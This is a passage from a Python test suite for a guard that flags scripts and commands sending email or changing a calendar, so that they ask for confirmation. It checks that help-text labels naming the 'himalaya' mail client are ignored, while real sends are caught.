        assert detect_outbound_command(f'python3 "{cli}" {args}')[:2] == (True, key)
        assert detect_outbound_command(f'bash -c "python3 {cli} {args}"')[:2] == (True, key)

    def test_a_cli_write_inside_a_buddy_script_still_asks(self, tmp_path, monkeypatch):
        cli = self._install(tmp_path, monkeypatch)
        script = tmp_path / "tidy.py"
        script.write_text(f"import subprocess\nsubprocess.run(['python3', {str(cli)!r}, 'gcal', 'delete', 'e1'])\n")
        assert detect_outbound_command(f"python3 {script}")[:2] == (True, "outbound:calendar")

    def test_scanning_the_installed_cli_by_path_never_asks(self, tmp_path, monkeypatch):
        # A host that runs a file by path goes through this entry point, and it
        # exempts the same file identity as the command-line scan.
        cli = self._install(tmp_path, monkeypatch)
        assert detect_outbound_script_file(str(cli))[0] is False

    def test_a_sending_script_by_path_still_asks(self, tmp_path, monkeypatch):
        self._install(tmp_path, monkeypatch)
        script = tmp_path / "send.py"
        script.write_text(OLD_SB_SOURCE + "import smtplib\nsmtplib.SMTP('smtp.gmail.com')\n")
        assert detect_outbound_script_file(str(script))[:2] == (True, "outbound:email")

    @pytest.mark.parametrize("text", [
        'mail.add_parser("setup", help="himalaya config for every connected mailbox")',
        'ArgumentParser(prog="himalaya")',
        'p.add_argument("--x", help="himalaya")',
        'table.add_row("x", description="himalaya login")',
        'table.add_row(name="x", usage="himalaya login")',
        'dict(help="himalaya config")',
        'mail.add_parser(\n    "setup",\n    help="himalaya config",\n)',
        # A `#` or a bracket inside a one-line string is text, not structure.
        'f("a # b", help="himalaya config")',
        'f(")", help="himalaya config")',
    ])
    def test_a_label_naming_the_mail_client_is_not_a_send(self, text):
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        'usage="himalaya"\nsubprocess.run([usage, "message", "send"])',
        'epilog = "himalaya"\nsend_mail(epilog)',
        'help = "himalaya"\nhelp.send()',
        'client="himalaya"\nclient.message.send()',
        # An attribute that holds the client is a real configuration, not a
        # label — base caught the bare form and still must.
        'cfg.client="himalaya"\nsubprocess.run([cfg.client, "message", "send"])',
        'self.mail="himalaya"\nsubprocess.run([self.mail, "message", "send"])',
        'x.y.client="himalaya"\nrun([x.y.client, "message", "send"])',
        # A comma or an open bracket left over from an earlier line does not
        # make the next line a keyword argument.
        'x = 1,\nusage="himalaya"\nsubprocess.run([usage, "message", "send"])',
        '# list the mail hosts,\nusage="himalaya"\nsubprocess.run([usage, "send"])',
        # A bare value passed at a call site is the client, not a label: only
        # prose or the argument parser's own keywords read as labels.
        'def send(prog):\n    subprocess.run([prog, "message", "send"])\nsend(prog="himalaya")',
        'send(usage="himalaya")',
        'kw = dict(prog="himalaya")\nsubprocess.run([kw["prog"], "message", "send"])',
        # A spaced attribute that holds the client is configuration too.
        'self.mail = "himalaya"\nsubprocess.run([self.mail, "message", "send"])',
        'cfg.client = "himalaya"\nrun([cfg.client, "message", "send"])',
        # Structure inside a string is not structure: an unmatched bracket in
        # one does not open a call, and a `#` in one does not start a comment.
        'f("a # b")\nclient="himalaya"\nsubprocess.run([client, "message", "send"])',
        's = "("\nclient="himalaya"\nrun([client, "message", "send"])',
        '# f(help="himalaya config")\nusage = "himalaya"\nrun([usage, "send"])',
        # A period in a comment or an Ellipsis is not an attribute dot.
        '# Configure the mail client.\nprog = "himalaya"\nsubprocess.run([prog, "message", "send"])',
        'def f():\n    ...\nprog = "himalaya"\nrun([prog, "message", "send"])',
        'x = 1  # see docs.\nusage = "himalaya"\nrun([usage, "send"])',
    ])
    def test_a_real_assignment_naming_the_mail_client_still_asks(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:email"

    def test_a_long_label_dense_help_text_is_read_to_the_end(self):
        # One pass, not one rescan per label: every line here names the client
        # in a help string, and none of them is a send.
        text = "\n".join(
            f'p.add_argument("--opt{i}", help="himalaya config for mailbox {i}")'
            for i in range(200))
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        'def send(prog="himalaya"):\n    subprocess.run([prog, "message", "send"])',
        'def send(a,\n         prog="himalaya"):\n    subprocess.run([prog, "message", "send"])',
        'class Send(prog="himalaya"):\n    run([prog, "message", "send"])',
        'HELP="himalaya"\nsubprocess.run([HELP, "message", "send"])',
        # PEP 695 generic heads open a bracket like any signature.
        'def f[T](prog="himalaya"):\n    run([prog, "message", "send"])',
        'class C[T](prog="himalaya"):\n    run([prog, "message", "send"])',
    ])
    def test_a_signature_default_is_not_a_label(self, text):
        # A `def` opens a bracket, but its default then names the mail client
        # for a real send.
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:email"

    def test_a_label_named_attribute_write_is_not_a_send(self):
        # `parser.description = ...` is prose about the client, so a spaced
        # attribute write whose name is a label stays silent — but the bare
        # form, and any spaced attribute whose name is not a label, keeps
        # base's reading of an attribute that may hold the client itself.
        assert detect_outbound_action(
            'parser.description = "himalaya login"')[0] is False
        assert detect_outbound_action(
            'parser.description = "himalaya"')[0] is False
        assert detect_outbound_action(
            'parser.description="himalaya login"')[0] is True

    def test_a_docstring_quote_does_not_hide_a_label(self):
        # A `"` inside a docstring used to end the scrub early and leave the
        # label below counted as a send.
        text = ('"""a " b"""\n'
                'parser.add_argument("setup", help="himalaya config")\n')
        assert detect_outbound_action(text)[0] is False

    def test_an_upper_case_label_is_not_a_send(self):
        # Label names are compared case-insensitively.
        assert detect_outbound_action(
            'parser.add_argument("x", HELP="himalaya config")')[0] is False

    def test_a_read_only_wrapper_still_asks(self):
        # Accepted over-ask: with the client in a plain variable the guard
        # cannot tell a read from a send, and asking is the safe direction.
        found, key, _ = detect_outbound_action(
            'HIMALAYA = "himalaya"\nrun([HIMALAYA, "message", "list"])')
        assert found and key == "outbound:email"
